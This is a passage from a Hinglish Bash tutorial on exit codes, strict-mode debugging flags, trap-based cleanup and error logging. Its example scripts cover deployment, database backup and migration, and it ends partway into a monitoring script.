# Check arguments
if [ $# -eq 0 ]; then
    echo "Error: No arguments provided"
    echo "Usage: $0 <filename>"
    exit 1
fi

filename=$1

# Check file exists
if [ ! -f "$filename" ]; then
    echo "Error: File not found: $filename"
    exit 2
fi

# Process file
echo "Processing $filename..."
cat "$filename"

# Success
echo "Done!"
exit 0
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Professional script with meaningful exit codes

set -euo pipefail

# Exit codes
readonly E_SUCCESS=0
readonly E_GENERAL=1
readonly E_MISUSE=2
readonly E_NO_FILE=3
readonly E_NO_PERMISSION=4
readonly E_NETWORK=5
readonly E_TIMEOUT=6

readonly SCRIPT_NAME=$(basename "$0")
readonly LOG_FILE="/var/log/${SCRIPT_NAME}.log"

# Logging function
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Error handler
error_exit() {
    local message=$1
    local exit_code=${2:-$E_GENERAL}
    
    log "ERROR: $message"
    exit "$exit_code"
}

# Cleanup on exit
cleanup() {
    local exit_code=$?
    
    log "Script exiting with code: $exit_code"
    
    # Cleanup temporary files
    rm -f /tmp/temp_$$_*
    
    # Send notification on failure
    if [ $exit_code -ne 0 ]; then
        echo "Script failed with code $exit_code" | \
            mail -s "Script Failure: $SCRIPT_NAME" admin@example.com
    fi
}

trap cleanup EXIT

# Validate prerequisites
validate_prerequisites() {
    log "Validating prerequisites..."
    
    # Check required commands
    for cmd in curl jq mysql; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            error_exit "Required command not found: $cmd" $E_GENERAL
        fi
    done
    
    # Check permissions
    if [ ! -w "$LOG_FILE" ]; then
        error_exit "Cannot write to log file: $LOG_FILE" $E_NO_PERMISSION
    fi
    
    log "✓ Prerequisites validated"
}

# Main function
main() {
    log "Starting $SCRIPT_NAME..."
    
    # Validate
    validate_prerequisites
    
    # Check arguments
    if [ $# -lt 2 ]; then
        echo "Usage: $0 <source> <destination>"
        error_exit "Insufficient arguments" $E_MISUSE
    fi
    
    local source=$1
    local destination=$2
    
    # Check source exists
    if [ ! -f "$source" ]; then
        error_exit "Source file not found: $source" $E_NO_FILE
    fi
    
    # Check network connectivity
    if ! ping -c 1 -W 2 google.com >/dev/null 2>&1; then
        error_exit "Network connectivity issue" $E_NETWORK
    fi
    
    # Process with timeout
    log "Processing $source..."
    
    if timeout 30 cp "$source" "$destination"; then
        log "✓ File copied successfully"
    else
        local status=$?
        if [ $status -eq 124 ]; then
            error_exit "Operation timed out" $E_TIMEOUT
        else
            error_exit "Copy failed" $E_GENERAL
        fi
    fi
    
    log "✓ Script completed successfully"
    exit $E_SUCCESS
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Exit code bhoolna:** Script end par `exit 0` dena
- ❌ **Same code har error ke liye:** Different errors = different codes
- ❌ **Range exceed:** 0-255 ke andar rakho

### 10. **Best Practices / Pro Tips**
- 💡 **Constants use karo:** `E_SUCCESS=0`, `E_ERROR=1`
- 💡 **Meaningful codes:** Different errors ke liye different codes
- 💡 **Document karo:** Script top par exit codes list karo
- 💡 **Cleanup:** `trap` use karo exit par

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# CI/CD deployment script with proper exit codes

set -euo pipefail

# Exit codes
readonly SUCCESS=0
readonly BUILD_FAILED=1
readonly TEST_FAILED=2
readonly DEPLOY_FAILED=3
readonly ROLLBACK_FAILED=4

readonly PROJECT_DIR="/var/www/app"
readonly BUILD_DIR="$PROJECT_DIR/build"

log() {
    echo "[$(date '+%H:%M:%S')] $1"
}

# Build application
build() {
    log "Building application..."
    
    cd "$PROJECT_DIR"
    
    if npm run build; then
        log "✓ Build successful"
        return 0
    else
        log "✗ Build failed"
        return 1
    fi
}

# Run tests
test() {
    log "Running tests..."
    
    if npm test; then
        log "✓ Tests passed"
        return 0
    else
        log "✗ Tests failed"
        return 1
    fi
}

# Deploy
deploy() {
    log "Deploying application..."
    
    if rsync -avz "$BUILD_DIR/" production:/var/www/; then
        log "✓ Deployment successful"
        return 0
    else
        log "✗ Deployment failed"
        return 1
    fi
}

# Rollback
rollback() {
    log "Rolling back..."
    
    if ssh production "cd /var/www && git checkout HEAD~1"; then
        log "✓ Rollback successful"
        return 0
    else
        log "✗ Rollback failed"
        return 1
    fi
}

# Main pipeline
main() {
    log "Starting CI/CD pipeline..."
    
    # Build
    if ! build; then
        log "Pipeline failed at build stage"
        exit $BUILD_FAILED
    fi
    
    # Test
    if ! test; then
        log "Pipeline failed at test stage"
        exit $TEST_FAILED
    fi
    
    # Deploy
    if ! deploy; then
        log "Pipeline failed at deploy stage"
        
        # Attempt rollback
        if ! rollback; then
            log "CRITICAL: Rollback failed!"
            exit $ROLLBACK_FAILED
        fi
        
        exit $DEPLOY_FAILED
    fi
    
    log "✓ Pipeline completed successfully"
    exit $SUCCESS
}

main "$@"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `exit 0` for success
- ✅ `exit 1-255` for errors
- ✅ Different codes for different errors
- ✅ Document exit codes
- ✅ Use constants for clarity

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Exit code range kya hai?**
A: 0-255. 0=success, 1-255=errors.

**Q2: Multiple exit points ho sakte hain?**
A: Haan, lekin cleanup ke liye `trap` use karo.

**Q3: Exit code kaise check karu calling script mein?**
A: `$?` variable use karo.

### 14. **Practice ke liye Task**

```bash
# 1. Simple script
#!/bin/bash
[ $# -eq 0 ] && exit 1
echo "Args: $@"
exit 0

# 2. With constants
#!/bin/bash
readonly SUCCESS=0
readonly ERROR=1

[ -f "$1" ] || exit $ERROR
cat "$1"
exit $SUCCESS

# 3. Test from command line
./script.sh
echo "Exit code: $?"

# 4. Use in pipeline
./script1.sh && ./script2.sh || echo "Failed"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🚪 `exit` terminates script with code
- ✅ 0 = success, 1-255 = errors
- 📋 Different errors = different codes
- 📝 Document exit codes in script
- 🧹 Use `trap` for cleanup

> **💡 Ye Zaroor Yaad Rakhein:**
> Hamesha meaningful exit codes use karo! 0=success, different errors ke liye different codes (1-255). Constants define karo aur document karo. CI/CD mein bahut important!

---

## **Topic 3: Debugging (`set -x`, `set -e`, `set -u`, `set -o pipefail`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Debugging Options** - Script ko robust aur debuggable banane ke powerful options.

### 2. **Ye Kya Hai? (What is it?)**
Bash ke debugging options script execution ko control karte hain. `set -x` har command print karta hai, `set -e` error par exit karta hai, `set -u` undefined variables ko error banata hai, aur `set -o pipefail` pipeline mein kisi bhi command ki failure ko catch karta hai.

**Analogy:** Yeh options ek safety net hain - jaise construction site par helmet, safety harness. Accidents hone se pehle rok dete hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Early error detection** - Problems jaldi pakdo
- ✅ **Debugging** - Execution flow dekho
- ✅ **Reliability** - Silent failures avoid
- ✅ **Production safety** - Robust scripts

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Production scripts
- Critical automation
- Debugging issues
- CI/CD pipelines

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Silent failures
- Undefined variable bugs
- Pipeline failures ignored
- Hard to debug issues

### 6. **Syntax aur Common Options**

```bash
# Individual options
set -e          # Exit on error
set -u          # Error on undefined variable
set -x          # Print commands (debug)
set -o pipefail # Pipeline fails if any command fails

# Combined (strict mode)
set -euo pipefail

# Disable options
set +e          # Disable exit on error
set +x          # Disable debug mode

# In shebang
#!/bin/bash -e
#!/bin/bash -eux
```

### 7. **Example 1 (Basic)**

```bash
#!/bin/bash

# Without set -e
echo "Starting..."
false           # This fails but script continues
echo "Still running"

# With set -e
set -e
echo "Starting with set -e..."
false           # Script exits here
echo "This won't print"

# set -u example
set -u
echo $UNDEFINED_VAR  # Error: unbound variable

# set -x example
set -x
name="John"
echo "Hello $name"
# Output: + name=John
#         + echo 'Hello John'
#         Hello John

# set -o pipefail example
set -o pipefail
false | true    # Without pipefail: succeeds
                # With pipefail: fails
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Production-ready script with all debugging options

# Strict mode
set -euo pipefail

# Optional: Enable debug mode via environment variable
[ "${DEBUG:-false}" = "true" ] && set -x

readonly SCRIPT_NAME=$(basename "$0")
readonly LOG_FILE="/var/log/${SCRIPT_NAME}.log"

# Trap errors
trap 'error_handler $? $LINENO' ERR

error_handler() {
    local exit_code=$1
    local line_number=$2
    
    echo "Error occurred in script at line $line_number with exit code $exit_code" >&2
    echo "Failed command: $(sed -n "${line_number}p" "$0")" >&2
    
    # Cleanup
    cleanup
    
    exit "$exit_code"
}

cleanup() {
    echo "Cleaning up..."
    rm -f /tmp/temp_$$_*
}

trap cleanup EXIT

# Function with error handling
process_file() {
    local file=$1
    
    # set -e ensures this exits on error
    [ -f "$file" ] || return 1
    
    # Pipeline with pipefail
    cat "$file" | grep "pattern" | sort | uniq
    
    # If any command in pipeline fails, function returns error
}

# Temporarily disable exit on error
safe_operation() {
    set +e
    
    # This might fail, but we handle it
    some_command_that_might_fail
    local status=$?
    
    set -e
    
    if [ $status -ne 0 ]; then
        echo "Command failed, but continuing..."
    fi
}

# Main logic
main() {
    echo "Starting $SCRIPT_NAME..."
    
    # These will auto-exit on error due to set -e
    mkdir -p /tmp/workdir
    cd /tmp/workdir
    
    # Undefined variable will cause error due to set -u
    local required_var="${REQUIRED_VAR:-default}"
    
    # Process files
    for file in *.txt; do
        if [ -f "$file" ]; then
            process_file "$file"
        fi
    done
    
    echo "Completed successfully"
}

# Debug mode example
debug_info() {
    if [ "${DEBUG:-false}" = "true" ]; then
        echo "=== Debug Info ==="
        echo "Script: $0"
        echo "Args: $@"
        echo "PWD: $PWD"
        echo "User: $USER"
        set -x  # Enable command tracing
    fi
}

debug_info "$@"
main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`set -e` with pipes:** Pipeline failures ignore ho sakte hain without `pipefail`
- ❌ **Conditional mein `set -e`:** `if command; then` mein `set -e` kaam nahi karta
- ❌ **`set -u` with `${var:-default}`:** Default values use karo

### 10. **Best Practices / Pro Tips**
- 💡 **Strict mode:** `set -euo pipefail` har script mein
- 💡 **Debug flag:** Environment variable se control karo
- 💡 **Trap ERR:** Error handler add karo
- 💡 **Selective disable:** `set +e` temporarily jahan zaroorat ho

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Database backup script with comprehensive error handling

set -euo pipefail

readonly BACKUP_DIR="/backups/mysql"
readonly LOG_FILE="/var/log/mysql_backup.log"
readonly RETENTION_DAYS=7

# Enable debug mode if DEBUG=true
[ "${DEBUG:-false}" = "true" ] && set -x

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Error trap
trap 'log "ERROR: Script failed at line $LINENO with exit code $?"' ERR
trap 'cleanup' EXIT

cleanup() {
    log "Cleanup: Removing temporary files"
    rm -f /tmp/mysql_backup_$$_*
}

# Validate environment
validate() {
    log "Validating environment..."
    
    # set -u will catch undefined variables
    : "${DB_USER:?DB_USER not set}"
    : "${DB_PASS:?DB_PASS not set}"
    
    # set -e will exit if commands fail
    command -v mysqldump >/dev/null
    mkdir -p "$BACKUP_DIR"
    
    log "✓ Validation passed"
}

# Backup database
backup_database() {
    local db=$1
    local backup_file="$BACKUP_DIR/${db}_$(date +%Y%m%d_%H%M%S).sql.gz"
    
    log "Backing up database: $db"
    
    # Pipeline with pipefail - any failure will exit
    mysqldump -u"$DB_USER" -p"$DB_PASS" "$db" | \
        gzip > "$backup_file"
    
    # Verify backup
    if [ -s "$backup_file" ]; then
        log "✓ Backup created: $backup_file ($(du -h "$backup_file" | cut -f1))"
    else
        log "✗ Backup file is empty or missing"
        return 1
    fi
}

# Cleanup old backups
cleanup_old_backups() {
    log "Cleaning up backups older than $RETENTION_DAYS days..."
    
    # Temporarily disable exit on error
    set +e
    
    find "$BACKUP_DIR" -name "*.sql.gz" -mtime +$RETENTION_DAYS -delete
    local status=$?
    
    set -e
    
    if [ $status -eq 0 ]; then
        log "✓ Old backups cleaned"
    else
        log "⚠️  Cleanup had issues (non-critical)"
    fi
}

# Main execution
main() {
    log "=== Starting MySQL Backup ==="
    
    validate
    
    # Get list of databases
    local databases=$(mysql -u"$DB_USER" -p"$DB_PASS" -e "SHOW DATABASES;" | \
        grep -Ev "^(Database|information_schema|performance_schema|mysql|sys)$")
    
    # Backup each database
    for db in $databases; do
        backup_database "$db"
    done
    
    cleanup_old_backups
    
    log "=== Backup completed successfully ==="
}

main "$@"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `set -e` exit on error
- ✅ `set -u` error on undefined vars
- ✅ `set -x` debug/trace mode
- ✅ `set -o pipefail` catch pipeline failures
- ✅ `set -euo pipefail` strict mode

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `set -e` kab kaam nahi karta?**
A: `if`, `while`, `until` conditions mein, aur `||`, `&&` ke saath.

**Q2: `set -x` output kaise control karu?**
A: `set +x` se disable karo, ya `DEBUG` environment variable use karo.

**Q3: Pipeline mein ek command fail ho toh?**
A: `set -o pipefail` use karo, warna last command ka status milega.

### 14. **Practice ke liye Task**

```bash
# 1. Test set -e
#!/bin/bash
set -e
echo "Start"
false
echo "This won't print"

# 2. Test set -u
#!/bin/bash
set -u
echo $UNDEFINED  # Error

# 3. Test set -x
#!/bin/bash
set -x
name="Test"
echo "Hello $name"

# 4. Test pipefail
#!/bin/bash
set -o pipefail
false | true
echo "Exit code: $?"

# 5. Strict mode
#!/bin/bash
set -euo pipefail
echo "Strict mode enabled"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🛑 `set -e` auto-exit on errors
- 🚫 `set -u` catch undefined variables
- 🔍 `set -x` trace execution
- 🔗 `set -o pipefail` pipeline safety
- 💪 `set -euo pipefail` = strict mode

> **💡 Ye Zaroor Yaad Rakhein:**
> Production scripts mein hamesha `set -euo pipefail` use karo! Yeh tumhari script ko robust banata hai. Debug ke liye `set -x` use karo. Trap ERR for error handling!

---

## **Topic 4: `trap` Command (Cleanup on exit)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**trap Command** - Signals aur events par custom actions execute karna.

### 2. **Ye Kya Hai? (What is it?)**
`trap` command signals (jaise Ctrl+C, script exit) ko catch karta hai aur specified command execute karta hai. Yeh cleanup, logging, ya graceful shutdown ke liye use hota hai. Script exit hone se pehle temporary files delete karna, connections close karna, etc.

**Analogy:** Trap ek emergency exit plan hai - jaise fire alarm bajne par kya karna hai, waise hi script interrupt hone par kya karna hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Cleanup** - Temporary files remove
- ✅ **Graceful shutdown** - Resources release
- ✅ **Error handling** - Exit par actions
- ✅ **Signal handling** - Ctrl+C, kill, etc.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Temporary files banate waqt
- Database connections
- Lock files
- Critical cleanup operations

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Resource leaks
- Orphaned processes
- Temporary files clutter
- Incomplete operations

### 6. **Syntax aur Common Options**

```bash
# Basic syntax
trap 'commands' SIGNAL

# Common signals
trap 'cleanup' EXIT      # Script exit (normal or error)
trap 'cleanup' INT       # Ctrl+C (SIGINT)
trap 'cleanup' TERM      # kill command (SIGTERM)
trap 'cleanup' ERR       # Error occurred

# Multiple signals
trap 'cleanup' EXIT INT TERM

# Remove trap
trap - SIGNAL

# List traps
trap -p
```

### 7. **Example 1 (Basic)**

```bash
#!/bin/bash

# Simple cleanup
cleanup() {
    echo "Cleaning up..."
    rm -f /tmp/tempfile_$$
}

trap cleanup EXIT

# Create temp file
echo "Creating temp file..."
touch /tmp/tempfile_$$

echo "Doing work..."
sleep 2

echo "Done"
# cleanup automatically called on exit

# Ctrl+C handler
handle_interrupt() {
    echo ""
    echo "Interrupted! Cleaning up..."
    rm -f /tmp/work_*
    exit 130
}

trap handle_interrupt INT

echo "Press Ctrl+C to interrupt..."
while true; do
    echo "Working..."
    sleep 1
done
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Production script with comprehensive trap handling

set -euo pipefail

readonly SCRIPT_NAME=$(basename "$0")
readonly PID=$$
readonly LOCK_FILE="/var/run/${SCRIPT_NAME}.lock"
readonly TEMP_DIR="/tmp/${SCRIPT_NAME}_${PID}"
readonly LOG_FILE="/var/log/${SCRIPT_NAME}.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Comprehensive cleanup function
cleanup() {
    local exit_code=$?
    
    log "Cleanup started (exit code: $exit_code)"
    
    # Remove temporary directory
    if [ -d "$TEMP_DIR" ]; then
        log "Removing temp directory: $TEMP_DIR"
        rm -rf "$TEMP_DIR"
    fi
    
    # Remove lock file
    if [ -f "$LOCK_FILE" ]; then
        log "Removing lock file: $LOCK_FILE"
        rm -f "$LOCK_FILE"
    fi
    
    # Close database connections
    if [ -n "${DB_CONN:-}" ]; then
        log "Closing database connection"
        # mysql -e "KILL $DB_CONN" 2>/dev/null || true
    fi
    
    # Stop background jobs
    local jobs=$(jobs -p)
    if [ -n "$jobs" ]; then
        log "Stopping background jobs"
        kill $jobs 2>/dev/null || true
    fi
    
    log "Cleanup completed"
    
    # Exit with original code
    exit $exit_code
}

# Handle interrupts (Ctrl+C)
handle_interrupt() {
    log "Received interrupt signal (SIGINT)"
    echo ""
    echo "Interrupted by user. Cleaning up..."
    cleanup
    exit 130
}

# Handle termination (kill)
handle_terminate() {
    log "Received termination signal (SIGTERM)"
    echo "Terminating gracefully..."
    cleanup
    exit 143
}

# Handle errors
handle_error() {
    local exit_code=$?
    local line_number=$1
    
    log "ERROR: Script failed at line $line_number with exit code $exit_code"
    log "Failed command: $(sed -n "${line_number}p" "$0")"
    
    cleanup
    exit $exit_code
}

# Set up traps
trap cleanup EXIT
trap handle_interrupt INT
trap handle_terminate TERM
trap 'handle_error $LINENO' ERR

# Create lock file to prevent multiple instances
create_lock() {
    if [ -f "$LOCK_FILE" ]; then
        local lock_pid=$(cat "$LOCK_FILE")
        
        if ps -p "$lock_pid" > /dev/null 2>&1; then
            log "ERROR: Another instance is running (PID: $lock_pid)"
            exit 1
        else
            log "Removing stale lock file"
            rm -f "$LOCK_FILE"
        fi
    fi
    
    echo $$ > "$LOCK_FILE"
    log "Lock file created: $LOCK_FILE"
}

# Initialize
initialize() {
    log "=== Starting $SCRIPT_NAME (PID: $$) ==="
    
    create_lock
    
    # Create temp directory
    mkdir -p "$TEMP_DIR"
    log "Temp directory created: $TEMP_DIR"
}

# Main work function
do_work() {
    log "Starting main work..."
    
    # Simulate long-running task
    for i in {1..10}; do
        log "Processing step $i/10..."
        
        # Create temp files
        echo "data $i" > "$TEMP_DIR/file_$i.txt"
        
        sleep 1
    done
    
    log "Main work completed"
}

# Main execution
main() {
    initialize
    do_work
    
    log "=== Script completed successfully ==="
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Quotes bhoolna:** `trap 'command'` quotes zaroori hain
- ❌ **EXIT trap mein exit:** Infinite loop ho sakta hai
- ❌ **Signal names galat:** `SIGINT` nahi, `INT` use karo

### 10. **Best Practices / Pro Tips**
- 💡 **EXIT trap:** Hamesha use karo cleanup ke liye
- 💡 **Multiple signals:** `trap 'cleanup' EXIT INT TERM`
- 💡 **Exit code preserve:** `exit_code=$?` save karo
- 💡 **Idempotent cleanup:** Multiple calls safe hone chahiye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Database migration script with proper cleanup

set -euo pipefail

readonly DB_NAME="production_db"
readonly BACKUP_FILE="/tmp/db_backup_$$.sql"
readonly MIGRATION_LOG="/var/log/migration.log"
readonly LOCK_FILE="/var/run/migration.lock"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$MIGRATION_LOG"
}

# Comprehensive cleanup
cleanup() {
    local exit_code=$?
    
    log "Cleanup: Starting (exit code: $exit_code)"
    
    # Remove backup if migration successful
    if [ $exit_code -eq 0 ] && [ -f "$BACKUP_FILE" ]; then
        log "Cleanup: Removing backup file"
        rm -f "$BACKUP_FILE"
    elif [ -f "$BACKUP_FILE" ]; then
        log "Cleanup: Keeping backup file for rollback: $BACKUP_FILE"
    fi
    
    # Remove lock
    if [ -f "$LOCK_FILE" ]; then
        rm -f "$LOCK_FILE"
        log "Cleanup: Lock file removed"
    fi
    
    # Restore database on failure
    if [ $exit_code -ne 0 ] && [ -f "$BACKUP_FILE" ]; then
        log "Cleanup: Migration failed, restoring database..."
        mysql "$DB_NAME" < "$BACKUP_FILE"
        log "Cleanup: Database restored from backup"
    fi
    
    log "Cleanup: Completed"
}

# Handle Ctrl+C
handle_interrupt() {
    log "Migration interrupted by user"
    echo ""
    echo "⚠️  Migration interrupted! Rolling back..."
    exit 130
}

# Set traps
trap cleanup EXIT
trap handle_interrupt INT TERM

# Create lock
if [ -f "$LOCK_FILE" ]; then
    log "ERROR: Migration already running"
    exit 1
fi
echo $$ > "$LOCK_FILE"

# Main migration
main() {
    log "=== Starting Database Migration ==="
    
    # Backup database
    log "Creating backup..."
    mysqldump "$DB_NAME" > "$BACKUP_FILE"
    log "✓ Backup created: $BACKUP_FILE"
    
    # Run migrations
    log "Running migrations..."
    for migration in migrations/*.sql; do
        log "Applying: $migration"
        mysql "$DB_NAME" < "$migration"
    done
    
    log "✓ All migrations applied successfully"
    log "=== Migration Completed ==="
}

main "$@"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `trap 'cleanup' EXIT` always use
- ✅ `trap 'handler' INT` for Ctrl+C
- ✅ `trap 'handler' ERR` for errors
- ✅ Cleanup idempotent hona chahiye
- ✅ Exit code preserve karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: EXIT trap kab execute hota hai?**
A: Script exit hone par - normal exit ya error, dono mein.

**Q2: Multiple traps ek saath kaise set karu?**
A: `trap 'cleanup' EXIT INT TERM ERR`

**Q3: Trap disable kaise karu?**
A: `trap - SIGNAL` use karo.

### 14. **Practice ke liye Task**

```bash
# 1. Basic cleanup
#!/bin/bash
cleanup() {
    echo "Cleaning up..."
    rm -f /tmp/test_$$
}
trap cleanup EXIT
touch /tmp/test_$$
echo "File created"

# 2. Ctrl+C handler
#!/bin/bash
trap 'echo "Interrupted!"; exit' INT
while true; do
    echo "Running..."
    sleep 1
done

# 3. Error handler
#!/bin/bash
trap 'echo "Error at line $LINENO"' ERR
set -e
false

# 4. Multiple signals
#!/bin/bash
cleanup() {
    echo "Cleanup called"
}
trap cleanup EXIT INT TERM
sleep 10
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🪤 `trap` catches signals and events
- 🧹 EXIT trap for cleanup
- ⚡ INT trap for Ctrl+C
- 🚨 ERR trap for errors
- 💪 Essential for robust scripts

> **💡 Ye Zaroor Yaad Rakhein:**
> Har production script mein `trap cleanup EXIT` use karo! Temporary files, locks, connections - sab cleanup karo. Ctrl+C handle karo gracefully. Idempotent cleanup likho!

---

## **Topic 5: Error Logging (Redirecting to `stderr` `>&2`, Logging to files)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Error Logging** - Errors ko properly log karna aur stderr par redirect karna.

### 2. **Ye Kya Hai? (What is it?)**
Error logging errors aur important messages ko stderr (file descriptor 2) par redirect karna hai using `>&2`, aur unhe files mein save karna hai future reference ke liye. Yeh normal output (stdout) se alag hota hai, jisse errors easily identify ho sakti hain.

**Analogy:** Error logging ek black box recorder hai - jab plane crash ho, toh pata chale kya hua. Logs se debugging easy ho jati hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Debugging** - Problems identify karna
- ✅ **Audit trail** - Kya hua record
- ✅ **Monitoring** - System health check
- ✅ **Compliance** - Regulatory requirements

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Production scripts
- Error messages
- Audit logging
- System monitoring

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Lost error information
- Hard to debug
- No audit trail
- Compliance issues

### 6. **Syntax aur Common Options**

```bash
# Redirect to stderr
echo "Error message" >&2

# Log to file
echo "Log message" >> /var/log/script.log

# Both stderr and file
echo "Error" | tee -a /var/log/error.log >&2

# Redirect all stderr to file
exec 2>> /var/log/error.log

# Timestamp
echo "[$(date)] Message" >> /var/log/script.log
```

### 7. **Example 1 (Basic)**

```bash
#!/bin/bash

# Simple error to stderr
error() {
    echo "ERROR: $1" >&2
}

# Simple logging
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> /var/log/script.log
}

# Usage
if [ ! -f "config.txt" ]; then
    error "Config file not found"
    log "ERROR: Config file missing"
    exit 1
fi

echo "Processing..."
log "Processing started"

# Separate stdout and stderr
./command > output.txt 2> error.txt

# Both to same file
./command > all.log 2>&1

# stderr to file, stdout to screen
./command 2>> error.log
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Professional logging system

set -euo pipefail

readonly SCRIPT_NAME=$(basename "$0")
readonly LOG_DIR="/var/log/${SCRIPT_NAME}"
readonly LOG_FILE="${LOG_DIR}/app.log"
readonly ERROR_LOG="${LOG_DIR}/error.log"
readonly DEBUG_LOG="${LOG_DIR}/debug.log"

# Log levels
readonly LOG_LEVEL_DEBUG=0
readonly LOG_LEVEL_INFO=1
readonly LOG_LEVEL_WARN=2
readonly LOG_LEVEL_ERROR=3
readonly LOG_LEVEL_FATAL=4

# Current log level (set via environment)
CURRENT_LOG_LEVEL=${LOG_LEVEL:-$LOG_LEVEL_INFO}

# Initialize logging
init_logging() {
    mkdir -p "$LOG_DIR"
    
    # Redirect all stderr to error log
    exec 2>> "$ERROR_LOG"
    
    # Log rotation check
    for log in "$LOG_FILE" "$ERROR_LOG" "$DEBUG_LOG"; do
        if [ -f "$log" ] && [ $(stat -f%z "$log" 2>/dev/null || stat -c%s "$log") -gt 10485760 ]; then
            mv "$log" "${log}.$(date +%Y%m%d_%H%M%S)"
            gzip "${log}.$(date +%Y%m%d_%H%M%S)" &
        fi
    done
}

# Logging functions
log_message() {
    local level=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local log_entry="[$timestamp] [$level] [$$] $message"
    
    echo "$log_entry" >> "$LOG_FILE"
}

log_debug() {
    [ $CURRENT_LOG_LEVEL -le $LOG_LEVEL_DEBUG ] || return 0
    log_message "DEBUG" "$1"
    echo "$1" >> "$DEBUG_LOG"
}

log_info() {
    [ $CURRENT_LOG_LEVEL -le $LOG_LEVEL_INFO ] || return 0
    log_message "INFO" "$1"
    echo "[INFO] $1"
}

log_warn() {
    [ $CURRENT_LOG_LEVEL -le $LOG_LEVEL_WARN ] || return 0
    log_message "WARN" "$1"
    echo "[WARN] $1" >&2
}

log_error() {
    [ $CURRENT_LOG_LEVEL -le $LOG_LEVEL_ERROR ] || return 0
    log_message "ERROR" "$1"
    echo "[ERROR] $1" >&2
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ERROR_LOG"
}

log_fatal() {
    log_message "FATAL" "$1"
    echo "[FATAL] $1" >&2
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] FATAL: $1" >> "$ERROR_LOG"
    exit 1
}

# Structured logging
log_structured() {
    local level=$1
    local message=$2
    shift 2
    
    local json='{'
    json+="\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\","
    json+="\"level\":\"$level\","
    json+="\"message\":\"$message\","
    json+="\"pid\":$$,"
    json+="\"script\":\"$SCRIPT_NAME\""
    
    # Add extra fields
    while [ $# -gt 0 ]; do
        json+=",\"$1\":\"$2\""
        shift 2
    done
    
    json+='}'
    
    echo "$json" >> "${LOG_DIR}/structured.log"
}

# Error handler with logging
error_handler() {
    local exit_code=$?
    local line_number=$1
    
    log_error "Script failed at line $line_number with exit code $exit_code"
    log_error "Failed command: $(sed -n "${line_number}p" "$0")"
    
    # Send alert
    if command -v mail >/dev/null 2>&1; then
        echo "Script $SCRIPT_NAME failed at line $line_number" | \
            mail -s "Script Failure Alert" admin@example.com
    fi
}

trap 'error_handler $LINENO' ERR

# Example usage
main() {
    init_logging
    
    log_info "Script started"
    log_debug "Debug mode enabled"
    
    # Simulate operations
    log_info "Connecting to database..."
    
    if ! ping -c 1 database.example.com >/dev/null 2>&1; then
        log_error "Cannot reach database server"
        log_structured "ERROR" "Database unreachable" \
            "host" "database.example.com" \
            "retry_count" "3"
        exit 1
    fi
    
    log_info "Database connection successful"
    
    # Warning example
    if [ $(df -h / | tail -1 | awk '{print $5}' | sed 's/%//') -gt 80 ]; then
        log_warn "Disk usage above 80%"
    fi
    
    log_info "Script completed successfully"
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`>&2` bhoolna:** Errors stdout par chale jaate hain
- ❌ **Timestamps nahi:** Kab hua pata nahi chalta
- ❌ **Log rotation nahi:** Disk full ho jati hai
- ❌ **Permissions ignore:** Log files write nahi ho pati

### 10. **Best Practices / Pro Tips**
- 💡 **Timestamps hamesha:** `[$(date)] message`
- 💡 **Log levels:** DEBUG, INFO, WARN, ERROR, FATAL
- 💡 **Structured logging:** JSON format for parsing
- 💡 **Log rotation:** Old logs compress/delete karo
- 💡 **Permissions:** Log directory writable ho

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production API monitoring script with comprehensive logging

set -euo pipefail

